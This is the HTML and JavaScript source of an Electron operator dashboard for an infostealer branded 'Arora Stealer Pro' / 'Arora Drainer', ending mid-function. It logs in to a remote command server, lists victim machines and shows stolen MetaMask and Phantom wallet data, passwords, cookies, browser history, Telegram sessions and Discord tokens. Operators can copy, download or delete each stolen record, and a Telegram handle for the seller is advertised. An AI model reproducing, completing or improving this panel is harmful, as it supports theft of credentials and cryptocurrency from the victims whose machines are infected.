<!doctype html>
<html>
  <head>
    <title>Arora Stealer Pro</title>
    <style>
      :root {
        --primary: #4a90e2;
        --danger: #e74c3c;
        --bg-dark: #0f0f0f;
        --bg-card: #1e1e1e;
        --text-main: #e0e0e0;
        --accent: #00ff00;
      }

      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        display: flex;
        margin: 0;
        background: var(--bg-dark);
        color: var(--text-main);
        height: 100vh;
        overflow: hidden;
      }

      #empty-state pre {
        text-shadow: 0 0 10px rgba(74, 144, 226, 0.5);
        animation: pulse 2s infinite ease-in-out;
      }

      .blink {
        animation: blinker 1s step-start infinite;
        color: var(--primary);
        font-weight: bold;
      }

      @keyframes blinker {
        50% {
          opacity: 0;
        }
      }

      #empty-state pre {
        text-shadow: 0 0 8px rgba(74, 144, 226, 0.3);
        /* Subtle scanline effect */
        background:
          linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%),
          linear-gradient(
            90deg,
            rgba(255, 0, 0, 0.03),
            rgba(0, 255, 0, 0.01),
            rgba(0, 0, 255, 0.03)
          );
        background-size:
          100% 2px,
          3px 100%;
      }

      @keyframes pulse {
        0% {
          opacity: 0.7;
          transform: scale(1);
        }
        50% {
          opacity: 1;
          transform: scale(1.02);
        }
        100% {
          opacity: 0.7;
          transform: scale(1);
        }
      }

      /* The background container */
      .login-bg-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: -1; /* Sits behind the login box */
        opacity: 0.05; /* Subtle look */
        pointer-events: none;
        user-select: none;
      }

      /* The scrolling text logic */
      .scrolling-text {
        font-family: "Courier New", monospace;
        font-size: 20px;
        color: var(--primary);
        white-space: nowrap;
        animation: scrollText 20s linear infinite;
      }

      @keyframes scrollText {
        0% {
          transform: translateX(0);
        }
        100% {
          transform: translateX(-50%);
        }
      }

      @keyframes shake {
        0%,
        100% {
          transform: translateX(0);
        }
        25% {
          transform: translateX(-10px);
        }
        75% {
          transform: translateX(10px);
        }
      }

      /* Glow for the login box */
      #login-box {
        box-shadow: 0 0 30px rgba(74, 144, 226, 0.2);
        border: 1px solid var(--primary) !important;
      }

      #sidebar {
        width: 320px;
        border-right: 1px solid #333;
        padding: 20px;
        background: #151515;
        display: flex; /* Added */
        flex-direction: column; /* Added */
        height: 100vh; /* Added: ensures sidebar takes full height */
        box-sizing: border-box; /* Added: prevents padding from breaking height */
      }

      #machine-list {
        flex: 1; /* Added: pushes everything else down */
        overflow-y: auto; /* Added: only the list scrolls, not the button */
        margin-bottom: 20px;
      }

      .badge-metamask,
      .badge-phantom {
        background: #e67e22 !important;
      }
      .badge-discord {
        background: #7289da !important;
      }
      .badge-telegram {
        background: #0088cc !important;
      }
      .badge-passwords {
        background: #c0392b !important;
      }

      .type-badge {
        background: #4a90e2;
        color: white;
        padding: 4px 12px;
        border-radius: 20px; /* Rounded pill style */
        font-size: 11px;
        font-weight: 600;
        white-space: nowrap; /* Prevents text wrapping inside badge */
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
      }

      /* Custom colors for specific types to make scanning faster */
      .type-badge:contains("metamask"),
      .type-badge:contains("Phantom") {
        background: #e67e22;
      }
      .type-badge:contains("Discord") {
        background: #7289da;
      }
      .type-badge:contains("Telegram") {
        background: #0088cc;
      }
      .type-badge:contains("Passwords") {
        background: #c0392b;
      }

      /* Sidebar Styling */
      #sidebar {
        width: 320px;
        border-right: 1px solid #333;
        overflow-y: auto;
        padding: 20px;
        background: #151515;
      }
      .machine-item {
        padding: 15px;
        border: 1px solid #222;
        cursor: pointer;
        border-radius: 8px;
        margin-bottom: 10px;
        transition: 0.2s;
        background: #1a1a1a;
        word-wrap: break-word; /* Ensures long machine IDs wrap properly */
      }
      .machine-item:hover {
        border-color: var(--primary);
        background: #222;
      }
      .machine-item.active {
        border-color: var(--primary);
        background: rgba(74, 144, 226, 0.1);
        border-left: 5px solid var(--primary);
      }

      /* Content Area */
      #content {
        flex: 1;
        padding: 30px;
        overflow-y: auto;
        display: flex;
        flex-direction: column;
      }

      /* Filter Bar */
      .filter-bar {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
        flex-wrap: wrap;
        padding-bottom: 15px;
        border-bottom: 1px solid #333;
      }
      .filter-btn {
        padding: 6px 12px;
        border-radius: 20px;
        border: 1px solid #444;
        background: transparent;
        color: #888;
        cursor: pointer;
        font-size: 12px;
        transition: 0.3s;
      }
      .filter-btn:hover {
        border-color: var(--primary);
        color: white;
      }
      .filter-btn.active {
        background: var(--primary);
        color: white;
        border-color: var(--primary);
      }

      /* Data Card Styling */
      .data-card {
        background: var(--bg-card);
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 25px;
        border: 1px solid #333;
        position: relative;
      }
      .card-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 15px;
      }
      .card-meta {
        display: flex;
        align-items: center;
        gap: 15px;
      }
      .type-badge {
        background: var(--primary);
        color: white;
        padding: 4px 10px;
        border-radius: 4px;
        font-size: 11px;
        font-weight: bold;
        text-transform: uppercase;
      }
      .timestamp {
        color: #666;
        font-size: 12px;
      }

      .card-actions {
        display: flex;
        gap: 8px;
      }
      .btn-sm {
        padding: 5px 10px;
        border-radius: 4px;
        border: none;
        cursor: pointer;
        font-size: 11px;
        font-weight: bold;
        color: white;
        transition: 0.2s;
      }
      .btn-copy {
        background: #27ae60;
      }
      .btn-dl {
        background: #2980b9;
      }
      .btn-del {
        background: #c0392b;
      }
      .btn-sm:hover {
        opacity: 0.8;
        transform: translateY(-1px);
      }

      pre {
        background: #000;
        padding: 15px;
        border-radius: 8px;
        overflow-x: auto;
        color: var(--accent);
        font-family: "Consolas", monospace;
        font-size: 13px;
        border: 1px solid #111;
        max-height: 400px;
      }

      /* Spinner */
      .spinner {
        border: 3px solid rgba(255, 255, 255, 0.1);
        width: 30px;
        height: 30px;
        border-radius: 50%;
        border-left-color: var(--primary);
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      /* ovelaylogin */
      .login-bg-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        opacity: 0.1; /* Increased slightly so you can see it's working */
        pointer-events: none;
        display: flex;
        flex-direction: column;
        justify-content: space-around; /* Spreads rows vertically */
      }

      .ticker-wrap {
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
      }

      .ticker-move {
        display: inline-block;
        white-space: nowrap;
        padding-right: 100%; /* Creates space for the loop */
        animation: ticker 30s linear infinite;
        font-family: "Courier New", monospace;
        font-size: 24px;
        font-weight: bold;
        color: red;
        text-transform: uppercase;
        letter-spacing: 10px;
      }

      @keyframes ticker {
        0% {
          transform: translateX(100%);
        }
        100% {
          transform: translateX(-100%);
        }
      }

      /* Reverse direction for the middle row */
      .reverse {
        animation-direction: reverse;
      }

      /* sticky header */

      /* Container for the sticky elements */
      #content {
        position: relative;

        padding-top: 0; /* Remove default padding to prevent extra space around sticky elements */
      }

      #detail-view {
        position: relative;
      }

      #machine-title {
        position: sticky;
        top: 0;
        background: var(--bg-dark); /* Match your main background color */
        margin: 0;
        padding: 20px 0 10px 0;
        z-index: 101;
      }

      .filter-bar {
        position: sticky;
        top: 55px; /* Adjust this to sit right below the title */
        background: var(--bg-dark);
        padding: 10px 0 20px 0;
        margin-bottom: 20px;
        z-index: 100;
        border-bottom: 1px solid #333; /* Visual separator when scrolling */
      }

      .sticky-header {
        position: sticky;
        top: 0;
        background: var(--bg-dark);
        z-index: 1000;
        padding-top: 20px;
        padding-bottom: 15px;
        border-bottom: 1px solid #333;
      }
/* login loading state */


/* Spinner */

#loginBtn {
  height: 48px;
  position: relative;
}


/* Optional shake animation for error */
@keyframes shake {
  0%, 100% { transform: translateX(0); }
  20%, 60% { transform: translateX(-10px); }
  40%, 80% { transform: translateX(10px); }
}



    </style>
  </head>
  <body>
    <!-- <div id="sidebar">
      <h2 style="margin-top: 0">Devices</h2>
      <div id="machine-list">Loading...</div>
      <button
        onclick="handleLogout()"
        style="
          margin-top: 20px;
          width: 100%;
          padding: 10px;
          background: var(--danger);
          color: white;
          border: none;
          border-radius: 4px;
          cursor: pointer;
        "
      >
        Logout
      </button>
    </div> -->

    <div id="sidebar">
      <h2 style="margin-top: 0">Devices</h2>

      <div id="machine-list">Loading...</div>

      <div id="sidebar-footer">
        <button
          onclick="handleLogout()"
          style="
            width: 100%;
            padding: 12px;
            background: var(--danger);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
          "
        >
          Logout
        </button>
      </div>
    </div>

    <div id="content">
      <div id="detail-view" style="display: none">
        <div class="sticky-header">
          <h2 id="machine-title" style="margin-bottom: 10px">
            Select a machine
          </h2>

          <div class="filter-bar" id="filter-bar">
            <button class="filter-btn active" onclick="setFilter(null)">
              All Data
            </button>
            <button class="filter-btn" onclick="setFilter('metamask')">
              Metamask
            </button>
            <button class="filter-btn" onclick="setFilter('Phantom')">
              Phantom
            </button>
            <button class="filter-btn" onclick="setFilter('Passwords')">
              Passwords
            </button>
            <button class="filter-btn" onclick="setFilter('X_Cookies')">
              (X)Cookies
            </button>
            <button class="filter-btn" onclick="setFilter('History')">
              History
            </button>
            <button class="filter-btn" onclick="setFilter('Telegram session')">
              Telegram
            </button>
            <button class="filter-btn" onclick="setFilter('Discord Tokens')">
              Discord
            </button>
            <button
              class="filter-btn"
              onclick="setFilter('Pofile information')"
            >
              Profile Autofill
            </button>
          </div>

          <div id="data-container"></div>
        </div>
      </div>
      <div
        id="empty-state"
        style="text-align: center; margin-top: 100px; color: #555"
      >
        <h3>No machine selected</h3>
        <p>Choose a device from the left panel to begin analysis.</p>
        <!-- <div
          id="empty-state"
          style="text-align: center; margin-top: 80px; color: #555"
        >
          <pre
            style="
              color: var(--primary);
              background: transparent;
              border: none;
              font-size: 14px;
              line-height: 1.2;
              margin-bottom: 20px;
              font-family: monospace;
            "
          >
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
    </pre
          >

          <div
            style="
              border-top: 1px solid #333;
              width: 200px;
              margin: 0 auto 20px auto;
            "
          ></div>

          <h3 style="color: #fff; letter-spacing: 2px">SYSTEM INTEL PRO</h3>

          <p
            style="
              color: var(--accent);
              font-family: &quot;Consolas&quot;, monospace;
              font-size: 14px;
            "
          >
            <span style="color: #888">// Contact Arora Drainer on telegram:</span> @aroraDrain
          </p>

          <p style="margin-top: 30px; color: #666; font-style: italic">
            Waiting for device selection...
          </p>
        </div> -->

        <div id="empty-state" style="text-align: center; margin-top: 60px">
          <pre
            style="
              color: var(--primary);
              background: transparent;
              border: none;
              font-size: 11px;
              line-height: 1.1;
              margin-bottom: 25px;
              font-family: &quot;Courier New&quot;, monospace;
              display: inline-block;
              text-align: left;
            "
          >
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
    </pre
          >

          <div
            style="
              margin: 20px auto;
              width: 400px;
              height: 1px;
              background: linear-gradient(
                90deg,
                transparent,
                var(--primary),
                transparent
              );
            "
          ></div>

          <h2
            style="
              color: #fff;
              letter-spacing: 5px;
              font-weight: 300;
              margin: 0;
            "
          >
            ARORA STEALER PRO
          </h2>

          <div style="margin-top: 15px">
            <span style="color: #555; font-family: monospace"
              >[ CONTACT Us]</span
            >
            <a
              href="https://t.me/aroraDrain"
              style="
                color: var(--accent);
                text-decoration: none;
                font-family: &quot;Consolas&quot;, monospace;
                font-size: 16px;
                margin-left: 10px;
              "
            >
              t.me/aroraDrain
            </a>
          </div>

          <div
            style="
              margin-top: 40px;
              color: #444;
              font-family: monospace;
              font-size: 12px;
              text-transform: uppercase;
              letter-spacing: 1px;
            "
          >
            <span class="blink">_</span> Status: Awaiting Connection from
            Peripheral Devices...
          </div>
        </div>
      </div>
    </div>
    <!-- login -->
    <!-- <div
      id="login-screen"
      style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #0f0f0f;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      "
    >
      <div
        style="
          background: #1e1e1e;
          padding: 40px;
          border-radius: 12px;
          border: 1px solid #333;
          text-align: center;
          width: 300px;
        "
      >
        <h2 style="margin-bottom: 20px; color: var(--primary)">Admin Login</h2>
        <input
          type="text"
          id="user"
          placeholder="Username"
          style="
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            background: #000;
            border: 1px solid #444;
            color: white;
            border-radius: 4px;
          "
        />
        <input
          type="password"
          id="pass"
          placeholder="Password"
          style="
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            background: #000;
            border: 1px solid #444;
            color: white;
            border-radius: 4px;
          "
        />
        <button
          onclick="handleLogin()"
          style="
            width: 100%;
            padding: 12px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
          "
        >
          Access System
        </button>
      </div>
    </div> -->

    <div
      id="login-screen"
      style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #080808;
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: hidden;
      "
    >
      <!-- <div class="login-bg-overlay">
        <div class="scrolling-text">
            ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER
        </div>
        <div class="scrolling-text" style="animation-direction: reverse; opacity: 0.5;">
            ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER
        </div>
        <div class="scrolling-text">
            ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER ARORA DRAINER
        </div>
        </div> -->

      <div class="login-bg-overlay">
        <div class="ticker-wrap">
          <div class="ticker-move">
            ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER
          </div>
        </div>
        <div class="ticker-wrap">
          <div class="ticker-move reverse" style="color: #222">
            ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER
          </div>
        </div>
        <div class="ticker-wrap">
          <div class="ticker-move">
            ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER
          </div>
        </div>
        <div class="ticker-wrap">
          <div class="ticker-move reverse">
            ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER ‚Ä¢ ARORA DRAINER
          </div>
        </div>
      </div>

      <div
        id="login-box"
        style="
          background: #151515;
          padding: 40px;
          border-radius: 8px;
          text-align: center;
          width: 320px;
          position: relative;
          z-index: 10000;
        "
      >
        <div style="margin-bottom: 25px">
          <div
            style="
              color: var(--primary);
              font-family: monospace;
              font-size: 10px;
              letter-spacing: 2px;
              margin-bottom: 5px;
            "
          >
            SECURE ACCESS
          </div>
          <h2
            style="
              margin: 0;
              color: #fff;
              text-transform: uppercase;
              letter-spacing: 3px;
            "
          >
            ARORA <span style="color: var(--primary)">STEALER</span>
          </h2>
        </div>

        <input
          type="text"
          id="user"
          placeholder="OPERATOR USERNAME"
          style="
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: #000;
            border: 1px solid #333;
            color: var(--accent);
            border-radius: 4px;
            font-family: monospace;
            outline: none;
          "
        />

        <input
          type="password"
          id="pass"
          placeholder="ACCESS KEY"
          style="
            width: 100%;
            padding: 12px;
            margin-bottom: 25px;
            background: #000;
            border: 1px solid #333;
            color: var(--accent);
            border-radius: 4px;
            font-family: monospace;
            outline: none;
          "
        />

        <button
        id="loginBtn"
          onclick="handleLogin()"
          style="
            width: 100%;
            padding: 12px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
          "
        >
          Initialize Access
        </button>

        <p
          style="
            margin-top: 20px;
            font-size: 10px;
            color: #444;
            font-family: monospace;
          "
        >
          &copy; 2026 ARORA DIGITAL SYSTEMS
        </p>
      </div>
    </div>

    <script>
      const { ipcRenderer } = require("electron");
      const axios = require("axios");

      let selectedMachineId = null;
      let currentFilter = null;
      let authToken = localStorage.getItem("token");
      const api = axios.create({
        baseURL: "https://systemint.onrender.com/api",
      });

      //Handle Admin Login

      // async function handleLogin() {
      //   const username = document.getElementById("user").value;
      //   const password = document.getElementById("pass").value;
      //   try {
      //     const res = await axios.post(
      //       "https://systemint.onrender.com/api/login",
      //       {
      //         username,
      //         password,
      //       },
      //     );
      //     authToken = res.data.token;
      //     localStorage.setItem("token", authToken);
      //     document.getElementById("login-screen").style.display = "none";
      //     loadMachines();
      //   } catch (e) {
      //     const box = document.getElementById("login-box");
      //     box.style.animation = "none";
      //     void box.offsetWidth; // trigger reflow
      //     box.style.border = "1px solid var(--danger)";
      //     box.style.animation = "shake 0.5s linear";
      //     alert("ACCESS DENIED");
      //   }
      // }


async function handleLogin() {
  const btn = document.getElementById("loginBtn");
  const originalText = btn.innerText;

  btn.disabled = true;
  btn.innerText = "Initializing...";

  try {
    const username = document.getElementById("user").value;
    const password = document.getElementById("pass").value;

    const res = await axios.post(
      "https://systemint.onrender.com/api/login",
      { username, password }
    );

    authToken = res.data.token;
    localStorage.setItem("token", authToken);
    document.getElementById("login-screen").style.display = "none";
    loadMachines();

  } catch (e) {
    const box = document.getElementById("login-box");
    box.style.animation = "none";
    void box.offsetWidth;
    box.style.border = "1px solid var(--danger)";
    box.style.animation = "shake 0.5s linear";
    alert("ACCESS DENIED");

  } finally {
    btn.disabled = false;
    btn.innerText = originalText;
  }
}



  let systemdata = []; // Global variable to store machine data for filtering

      async function loadMachines() {
        try {
          const res = await api.get("/systems", {
            headers: { Authorization: `Bearer ${authToken}` },
          });
        systemdata = res.data; // Store the full data for filtering later
          const list = document.getElementById("machine-list");
          list.innerHTML = res.data
            .map(
              (m) => `
                <div class="machine-item ${selectedMachineId === m.machineId ? "active" : ""}" onclick="viewMachine('${m.machineId}')">
                    <strong>${m.hostname || "Unknown"}</strong><br>
                    <small style="color:#666">${m.machineId}</small> <br></br>
                    <small style="color:#666">${m.os}</small>
                </div>
            `,
            )
            .join("");
        } catch (e) {
          if (e.response && e.response.status === 401) {
            console.warn("Token expired. Logging out...");
            handleLogout();
          }
          container.innerHTML = `<p style="color:var(--danger)">Error loading data.</p>`;

          console.error("API Offline");
        }
      }

      function setFilter(type) {
        currentFilter = type;

        // 1. Highlight logic
        document.querySelectorAll(".filter-btn").forEach((btn) => {
          const btnText = btn.innerText.toLowerCase();
          const isAll = type === null && btnText.includes("all");
          const isMatch =
            type &&
            type
              .toLowerCase()
              .includes(btnText.replace("(x)", "").trim().toLowerCase());
          btn.classList.toggle("active", isAll || isMatch);
        });

        // 2. THE MISSING PART: You must call viewMachine to update the data!
        viewMachine(selectedMachineId, type);
      }

      async function viewMachine(id, filterType = null) {
        if (!id) return;
        selectedMachineId = id;

       const currentSystem = systemdata.find((sys) => sys.machineId === id);

        const container = document.getElementById("data-container");
        document.getElementById("empty-state").style.display = "none";
        document.getElementById("detail-view").style.display = "block";
        document.getElementById("machine-title").innerText = `Device : ${currentSystem.hostname || "Unknown"} (${currentSystem.os})`;

        container.innerHTML = `<div class="spinner"></div>`;

        try {
          // Use URL parameters for clean encoding of spaces
          const res = await api.get(`/fetch/${id}`, {
            params: { type: filterType },
            headers: { Authorization: `Bearer ${authToken}` },
          });
          const logs = res.data;

          if (logs.length === 0) {
            container.innerHTML = `<p style="text-align:center; color:#666; padding: 20px;">No ${filterType || ""} logs found.</p>`;
            return;
          }

          container.innerHTML = logs
            .map((entry) => {
              const payloadStr = JSON.stringify(entry.payload, null, 2);
              const safePayload = payloadStr
                .replace(/`/g, "\\`")
                .replace(/\$/g, "\\$");

              const typeClass = entry.dataType.toLowerCase().split(" ")[0]; // gets "discord" from "Discord Tokens"

              return `
                   <div class="data-card">
            <div class="card-header">
                <div class="card-meta">
                    <span class="type-badge badge-${typeClass}">${entry.dataType}</span>
                    <span class="timestamp">${new Date(entry.collectedAt).toLocaleString()}</span>
                </div>
                <div class="card-actions">
                    <button class="btn-sm btn-copy" onclick="copySingle(this)">Copy JSON</button>
                    <button class="btn-sm btn-dl" onclick="downloadSingle(this, '${entry.dataType}')">Download</button>
                    <button class="btn-sm btn-del" onclick="deleteLog('${entry._id}')">Delete</button>
                </div>
            </div>
            <pre class="payload-text">${payloadStr}</pre>
        </div>
                `;
            })
            .join("");
        } catch (e) {
          if (e.response && e.response.status === 401) {
            console.warn("Token expired. Logging out...");
            handleLogout();
          }
          container.innerHTML = `<p style="color:var(--danger); text-align:center;">Connection Error. Token expired?</p>`;
        }
      }

      function copySingle(btn) {
        // Look up to the card, then find the pre tag inside it
        const card = btn.closest(".data-card");
        const content = card.querySelector(".payload-text").innerText;

        ipcRenderer.send("copy-to-clipboard", content);

        // UI Feedback
        const originalText = btn.innerText;
        btn.innerText = "Copied!";
        btn.style.background = "#2ecc71";
        setTimeout(() => {
          btn.innerText = originalText;
          btn.style.background = "";
        }, 2000);
      }

      function downloadSingle(btn, type) {
        // Look up to the card, then find the pre tag inside it
        const card = btn.closest(".data-card");
        const content = card.querySelector(".payload-text").innerText;

        const safeName = type.replace(/\s+/g, "_");
        const filename = `${safeName}_${selectedMachineId}_${Date.now()}.json`;

        ipcRenderer.send("download-json", { filename, content });
      }

      async function deleteLog(logId) {
        if (!confirm("Delete this record?")) return;
        try {
          await api.delete(`/intel/${logId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          viewMachine(selectedMachineId, currentFilter);
        } catch (e) {
          alert("Delete failed");
        }
      }

      function handleLogout() {
        // 1. Remove the token from local storage
        localStorage.removeItem("token");

        // 2. Clear the variable in memory
        authToken = null;

        // 3. Force the app to show the login screen again
        document.getElementById("login-screen").style.display = "flex";

        // 4. Optional: Clear the machine list and data view so the next user sees a blank slate
        document.getElementById("machine-list").innerHTML = "";
        document.getElementById("detail-view").style.display = "none";
        document.getElementById("empty-state").style.display = "block";

        console.log("User logged out and token destroyed.");
      }

      // At the very bottom of your script
      async function init() {
        const loginScreen = document.getElementById("login-screen");

        // --- NEW PING LOGIC ---
